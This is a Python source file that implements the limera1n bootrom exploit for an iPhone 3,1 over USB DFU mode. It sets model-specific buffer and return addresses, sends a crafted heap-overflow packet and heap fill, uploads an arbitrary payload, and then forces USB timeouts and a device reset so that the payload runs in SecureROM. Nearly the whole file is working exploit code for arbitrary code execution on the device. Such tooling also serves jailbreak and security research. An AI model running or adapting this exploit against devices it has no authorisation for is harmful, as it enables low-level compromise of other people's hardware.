import struct
from dataclasses import dataclass
from typing import Self

import usb
from strongarm.macho import VirtualMemoryPointer

from device import Device, acquire_device, DeviceMode
from os_build import DeviceModel
from utils import TotalEnumMapping


_Cursor = int


_PAGE_4KB_SIZE = 0x1000


class UsbDidNotTimeout(Exception):
    pass


@dataclass
class SecureRomLimera1nExploitInfo:
    receive_image_buf_base: VirtualMemoryPointer
    receive_image_buf_size: int
    dfu_max_packet_size: int
    return_to_stack_addr: VirtualMemoryPointer

    @classmethod
    def info_for_model(cls, model: DeviceModel) -> Self:
        return TotalEnumMapping({
            DeviceModel.iPhone3_1: cls(
                receive_image_buf_base=VirtualMemoryPointer(0x84000000),
                receive_image_buf_size=0x2c000,
                dfu_max_packet_size=0x800,
                return_to_stack_addr=VirtualMemoryPointer(0x8403BF9C),
            )
        })[model]

    @property
    def shellcode_addr(self) -> VirtualMemoryPointer:
        # Add 1 so the shellcode executes in Thumb
        return self.receive_image_buf_base + self.receive_image_buf_size - _PAGE_4KB_SIZE + 1
    def full_dfu_packet_with_fill(self, fill: int) -> bytearray:
        if not (0 < fill < 255):
            raise ValueError(f"Fill must fit in a byte: {fill}")
        return bytearray(fill.to_bytes(1, "little", signed=False) * self.dfu_max_packet_size)


def _write_u32(buf: bytearray, offset: _Cursor, val: int) -> _Cursor:
    struct.pack_into("<I", buf, offset, val)
    return offset + 4


def _upload_data_to_force_timeout(device: Device, exploit_info: SecureRomLimera1nExploitInfo) -> None:
    # The data isn't important, we just want to force a timeout
    print('Sending arbitrary data to force a timeout')
    data = exploit_info.full_dfu_packet_with_fill(0xbb)
    try:
        device.dfu_upload_data(data, timeout_ms=10)
        raise UsbDidNotTimeout
    except usb.core.USBTimeoutError:
        # Expected/desired here
        pass


def execute_securerom_payload(device: Device, payload: bytes) -> None:
    """Execute a payload in SecureROM using limera1n"""
    print(f'Executing a payload of {len(payload)} bytes in SecureROM via limera1n...')
    exploit_info = SecureRomLimera1nExploitInfo.info_for_model(device.model)

    dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xcc)
    packet_cursor = 0
    for i in range(0, len(dfu_packet_buf), 0x40):
        packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, 0x405)
        packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, 0x101)
        packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, exploit_info.shellcode_addr)
        packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, exploit_info.return_to_stack_addr)

    # Send the heap fill
    # (This one includes the overflow data)
    print('Sending heap fill')
    device.dfu_upload_data(dfu_packet_buf)

    # Fill the heap with more garbage
    print('Filling the heap with more garbage')
    dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xcc)
    for i in range(0, exploit_info.receive_image_buf_size - 0x1800, exploit_info.dfu_max_packet_size):
        device.dfu_upload_data(dfu_packet_buf)

    print('Sending payload...')
    device.dfu_upload_data(payload)

    dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xbb)
    device.handle.ctrl_transfer(0xa1, 1, 0, 0, dfu_packet_buf, 1000)

    _upload_data_to_force_timeout(device, exploit_info)
    # This should fail too
    try:
        device.handle.ctrl_transfer(0x21, 2, 0, 0, dfu_packet_buf, 10)
        raise UsbDidNotTimeout()
    except usb.core.USBTimeoutError:
        # Expected/desired here
        pass
    print(f'Sent exploit to overflow heap')

    # Reset the device and inform it there's a file ready to be processed
    device.handle.reset()
    device.dfu_notify_upload_finished()
    with acquire_device(DeviceMode.DFU):
        print('Device reconnected limera1n exploit successful')
